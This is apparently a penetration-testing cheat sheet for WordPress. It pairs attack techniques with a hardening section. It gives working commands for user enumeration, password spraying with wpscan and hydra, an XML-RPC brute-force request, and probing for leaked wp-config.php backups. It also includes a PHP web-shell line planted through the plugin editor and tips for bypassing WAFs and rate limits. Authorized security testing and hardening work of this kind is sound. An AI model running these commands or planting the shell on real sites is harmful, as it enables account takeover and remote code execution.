# WordPress

> Most-deployed CMS on the public web → most-targeted. Pentest paths: user enumeration, plugin/theme CVEs, weak admin auth, XML-RPC abuse, wp-config.php exposure. Authorized testing only.

## TL;DR
- WordPress core itself is relatively well-audited; the bulk of CVEs come from the plugin ecosystem (60k+ on the marketplace, varying quality).
- Five primary attack paths:
  1. User enumeration → password spray on `/wp-login.php`.
  2. Plugin/theme version → public exploit DB.
  3. XML-RPC (`/xmlrpc.php`) brute-force amplification + SSRF.
  4. Author-enum via `?author=N` and `/wp-json/wp/v2/users` REST API.
  5. wp-config.php leakage via misconfigured backups (`wp-config.php.bak`, `wp-config.php~`).
- Tool: **wpscan** (Ruby) — the canonical scanner with a CVE database.
- Defence: keep core + plugins + themes patched; remove unused plugins; rate-limit `/wp-login.php`; disable XML-RPC if unused; principle of least privilege per role.

## Detection / Discovery

### Confirm it's WordPress
```bash
# Fingerprints
curl -sI https://target/ | grep -i 'wp-\|x-pingback'
curl -s https://target/ | grep -iE '(wp-content|wp-includes|generator.*WordPress)'
curl -s https://target/readme.html | head            # often present, leaks core version
curl -s https://target/wp-login.php | head -20
curl -s https://target/wp-json | jq .                # REST API root
```

### Core version
- `/readme.html` → version in `<h1 class="screen-reader-text">`.
- `/wp-includes/version.php` (usually 403 but sometimes 200).
- `wp-content/themes/twentytwentythree/style.css` → twentytwentythree theme tells you it's a ≥ 6.1 install.

### Plugin / theme inventory
```bash
# wpscan — needs WPScan API token for plugin CVE lookups
wpscan --url https://target/ --enumerate u,p,t,vp,vt --api-token <token>
# u  = users
# p  = popular plugins
# t  = popular themes
# vp = vulnerable plugins
# vt = vulnerable themes
```

### User enumeration
```bash
# Method 1 — author archives
for i in 1 2 3 4 5; do
  curl -sI "https://target/?author=$i" | grep -i location
  # 301/302 to /author/<slug>/ leaks the username
done

# Method 2 — REST API (locked down by default since 4.7+ but often re-opened)
curl -s https://target/wp-json/wp/v2/users | jq -r '.[].slug'

# Method 3 — login-error oracle (WP doesn't differentiate 'invalid user' vs 'invalid password' by default,
# but many security plugins reintroduce the leak)
```

## Exploitation

### Password spray on `/wp-login.php`
```bash
# wpscan brute mode
wpscan --url https://target/ --usernames userlist.txt --passwords rockyou-top.txt --max-threads 5

# hydra
hydra -L users.txt -P passwords.txt target.tld http-post-form \
  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=login_error'
```
Note: Wordfence / iThemes Security plugins block after ~3 failures; verify lockout before spray-style attempts.

### XML-RPC abuse (`/xmlrpc.php`)
```bash
# Confirm enabled
curl -sI https://target/xmlrpc.php
# 405 Method Not Allowed for GET = enabled

# wp.getUsersBlogs brute (one auth attempt per request — rate-limit-bypass for some setups)
curl -sk -X POST https://target/xmlrpc.php -H 'Content-Type: text/xml' -d '
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>'

# system.multicall — pack many auth attempts into one request (massive amplification)
# Generates large response objects with isAdmin=false for failed creds, populated user-blog data for success
```

### Plugin-CVE exploitation
After plugin enumeration, look up each plugin + version on:
- WPScan Database: https://wpscan.com/plugins
- WPVulnDB API (now WPScan).
- Patchstack: https://patchstack.com/database/
- exploit-db / GitHub search.

Common high-impact classes:
- File upload bypass in form / file-manager plugins → web shell.
- SQL injection in WP_Query-using plugins → user table dump.
- Unauthenticated stored XSS → admin cookie steal.
- Authentication bypass (e.g., LearnDash, Elementor critical CVEs of 2023-2024).

### wp-config.php leakage
```bash
# Common backup paths
for ext in '' .bak .save '~' .swp .orig .old .txt; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target/wp-config.php$ext"
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "https://target/wp-config$ext"
done
```
Recovered file contains `DB_USER`, `DB_PASSWORD`, salts, and (if multisite) other secrets.

### Admin RCE — theme/plugin editor
With admin creds (`wp-admin/`), the **Plugin Editor** (`/wp-admin/plugin-editor.php`) lets you write PHP directly into an installed plugin. Modify a rarely-used file (`plugin-name/uninstall.php`) → request the file → RCE.

```php
<?php system($_GET['c']); ?>
```
Same trick on theme editor (`/wp-admin/theme-editor.php`). Block by `define('DISALLOW_FILE_EDIT', true);` in wp-config.

### Hardcoded secrets via REST API
Some plugins inadvertently expose API keys in REST routes:
```bash
curl -s https://target/wp-json/<plugin-route>/ | jq
```

## Bypasses
- WAF blocks `wpscan` user-agent → `wpscan --random-user-agent`.
- 403 on `/wp-login.php` but `/wp-login.php/x.php` (path-normalisation) → may bypass.
- Author enum returns 301 to homepage (not to /author/slug/) → try the REST API or sitemap (`/wp-sitemap-users-1.xml`).
- Rate-limit on `wp-login.php` but `xmlrpc.php` unlimited → use it.

## Defence / Remediation
- **Patch cadence**: WP core auto-updates by default (good); plugin/theme updates frequently lag — automate.
- **Remove unused plugins/themes** entirely; deactivated-but-installed plugins still ship CVEs.
- **WordPress security plugins**: Wordfence, iThemes Security, Sucuri — rate-limit login, alert on file changes, block known-bad IPs.
- **Disable XML-RPC** if not used: `add_filter('xmlrpc_enabled', '__return_false');` or block at web-server layer:
  ```nginx
  location = /xmlrpc.php { deny all; }
  ```
- **Lock down REST API**: `add_filter('rest_authentication_errors', ...)` to require auth on `/wp-json/wp/v2/users`.
- **`DISALLOW_FILE_EDIT`** + **`DISALLOW_FILE_MODS`** in wp-config.php.
- **Force HTTPS** + **HSTS** on the admin path (and ideally everywhere).
- **MFA on admin accounts** — WP-Two-Factor / Duo / Wordfence MFA.
- **Move `/wp-admin/` to non-default path** (custom-login-url plugins) — security-by-obscurity; minor effort, slows automated attackers.
- **CSP** on the admin area — most plugins don't use inline scripts (test before enforce).
- **File-integrity monitoring**: alert on changes to `wp-content/plugins/*/*.php` outside change windows.
- **Backups**: store outside the doc-root; never call them `wp-config.php.bak`.

## Sources
- WordPress Security Whitepaper: https://wordpress.org/about/security/
- WPScan: https://wpscan.com/
- WPScan vulnerability DB: https://wpscan.com/plugins
- Patchstack DB: https://patchstack.com/database/
- HackTricks WordPress: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/wordpress.html
- OWASP WordPress Security: https://wordpress.org/documentation/article/hardening-wordpress/
- WP-CLI (operations toolkit): https://wp-cli.org/
- Wordfence research: https://www.wordfence.com/blog/category/wordpress-security/
- Sucuri research: https://blog.sucuri.net/
